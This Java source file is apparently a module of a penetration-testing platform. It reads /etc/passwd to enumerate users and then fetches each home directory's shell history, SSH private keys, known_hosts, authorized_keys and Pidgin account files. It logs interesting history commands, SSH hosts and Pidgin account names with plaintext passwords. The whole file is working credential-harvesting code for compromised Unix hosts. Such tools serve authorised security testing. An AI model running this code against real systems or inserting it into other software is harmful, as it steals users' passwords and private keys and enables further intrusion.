package com.netifera.platform.host.filesystem.spider.modules;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import com.netifera.platform.host.filesystem.File;
import com.netifera.platform.host.filesystem.spider.IFileContent;
import com.netifera.platform.host.filesystem.spider.IFileSystemSpiderContext;
import com.netifera.platform.host.filesystem.spider.IFileSystemSpiderModule;
import com.netifera.platform.net.model.UserEntity;

public class HomesHarvester implements IFileSystemSpiderModule {

	public String getName() {
		return "Harvest User Home Directories";
	}

	public void handle(IFileSystemSpiderContext context, File file, IFileContent content) throws IOException {
		if (file.getAbsolutePath().equals("/etc/passwd")) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(content.getContentStream()));
			try {
				String line = reader.readLine();
				while (line != null) {
					String[] parts = line.split(":");
					String username = parts[0];
					String home = parts[5];
					
					UserEntity userEntity = Activator.getInstance().getNetworkEntityFactory().createUser(context.getRealm(), context.getSpaceId(), context.getHostAddress(), username);
					userEntity.setHome(home);
					userEntity.update();
					
					fetchHomeFiles(context, username, home);
					
					line = reader.readLine();
				}
			} finally {
				reader.close();
			}
		} else if (file.getAbsolutePath().matches(".*history")) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(content.getContentStream()));
			try {
				String line = reader.readLine();
				while (line != null) {
					if (line.matches(".*(mysql|sqlplus|telnet|ssh|scp|ftp|wget).*"))
						context.getLogger().info("History "+file+": "+line);
					line = reader.readLine();
				}
			} finally {
				reader.close();
			}
		} else if (file.getAbsolutePath().matches(".*/.ssh/known_hosts")) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(content.getContentStream()));
			try {
				String line = reader.readLine();
				while (line != null) {
					if (line.contains(" "))
						context.getLogger().info("SSH "+file+": "+line.split(" ")[0]);
					line = reader.readLine();
				}
			} finally {
				reader.close();
			}
		} else if (file.getAbsolutePath().matches(".*/.purple/accounts.xml")) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(content.getContentStream()));
			try {
				String line = reader.readLine();
				while (line != null) {
					line = line.trim();
					if (line.matches(".*<protocol>([^<]+)</protocol>.*"))
							context.getLogger().info("Pidgin "+file+": "+line);
					else if (line.matches(".*<name>([^<]+)</name>.*"))
						context.getLogger().info("Pidgin "+file+": "+line);
					else if (line.matches(".*<password>([^<]+)</password>.*"))
						context.getLogger().info("Pidgin "+file+": "+line);
					line = reader.readLine();
				}
			} finally {
				reader.close();
			}
		}
	}
	
	private void fetchHomeFiles(IFileSystemSpiderContext context, String username, String home) {
		for (String fileName: new String[] {".bash_history", ".history", ".ssh/id_rsa", ".ssh/identity", ".ssh/known_hosts", ".ssh/authorized_keys", ".purple/accounts.xml"})
			context.getSpider().fetch(home+"/"+fileName);
	}

	public boolean isCompatible(String system) {
		return !system.matches("(?i)windows|win32");
	}

	public void start(IFileSystemSpiderContext context) {
		context.getSpider().fetch("/etc/passwd");
	}

	public void stop(IFileSystemSpiderContext context) {
	}
}
